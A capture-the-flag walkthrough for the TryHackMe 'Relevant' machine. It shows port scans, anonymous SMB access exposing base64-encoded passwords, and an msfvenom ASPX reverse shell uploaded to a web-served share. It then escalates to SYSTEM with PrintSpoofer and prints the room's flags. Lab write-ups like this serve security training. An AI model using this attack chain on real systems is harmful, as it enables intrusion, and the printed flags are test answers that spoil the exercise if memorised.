# Relevant
Difficulty: Medium
https://tryhackme.com/room/relevant

export target=10.10.63.65

## Obtain User Flag
vulners nmap scan:
    80/tcp   open  http
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3389/tcp open  ms-wbt-server
    
Second nmap scan:
`nmap -sC -sV -vv -A $target --script=vulners -Pn -oN scans/nmap-full`
    80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
    139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
    
All ports nmap scan:
`nmap -p- --min-rate 10000 -v $target -oN scans/nmap-all-ports`

80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown         - IS A WEB SERVER
49667/tcp open  unknown
49669/tcp open  unknown

Gobuster Directory Bruteforce:
`gobuster dir -u http://$target:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee scans/gobuster-dirs`
- /*checkout*

Second Web Server:
`gobuster dir -u http://$target:49663 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee scans/gobuster-dirs`

Notes:

SMB Service on port 445
`smbclient -L $target`
Found SMB Share: nt4wrksv

Logged in anonymously using smbclient to check the share
`smblcient \\\\<ip>\\nt4wrksv`

A file called "passwords.txt" is located in the share so I downloaded it and viewed it on my local machine.
I recognised this as base64 and passed it to cyberchef and decoded from base64 to get the following output:

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

We now have 2 usernames "bob" & "bill" along with their respective passwords

I used the above with impacket-psexec to enumerate the SMB shares:
`impacket-psexec bob:'!P@$$W0rD!123'@<ip>`
`impacket-psexec bill:'Juw4nnaM4n420696969!$$$'@<ip>`

There's nothing I can do with the bob user that I can't do with the anonymous user and the bill user is a fake user.

I decide to check the other ports on the server manually:
- Port: 49663 contains a webserver with the same page as port 80

I run gobuster against the directory and don't find anything new.

Out of curiosity I test the below URLS:
http://<ip>/nt4wrksv/passwords.txt: Nothing
http://<ip>:49663/nt4wrksv/passwords.txt: Same as smb share!

Files uploaded as the guest on the SMB share are accessible to the web server, viewable even.
Time to check for a file upload vulnerability.

I did some research on what potential there is for a reverse shell on ISS and found that it uses ab ASPX shell.
So I used msfvenom to create this shell.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<local ip> LPORT=4444 -f aspx -o revshell.aspx`
I then uploaded this to the SMB share and started a pwncat listener

`pwncat --listen 4444` & navigated to http://<ip>:49663/nt4wrksv/revshell.aspx to gain a reverse shell on powershell.

I navigated to a known user directory 
`cd C:\Users\Bob\` & searched for files finding user.txt on the user's desktop
`more Desktop\user.txt` - contains flag THM{fdk4ka34vk346ksxfr21tg789ktf45}

Tried to access C:\Users\Administrator however was given access denied.

I check the privs on the cirrent user using `whoami /priv`
```
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

After a bit of searching on google I found a hacktricks post on exploiting SeImpersonatePrivilege using https://github.com/itm4n/PrintSpoofer.

I downloaded the .exe and uploaded it to the SMB share then attempted to execute the executable.

`C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -i -c cmd.exe`
-i =  Interactive shell
-c cmd.exe = execute cmd.exe

executing gives me system privileges checked using `whoami` for the output nt authority\system

I was then able to access the Administrator account's files and found the root.txt on it's desktop: 

THM{1fk5kf469devly1gl320zafgl345pv}

## Obtain Root Flag
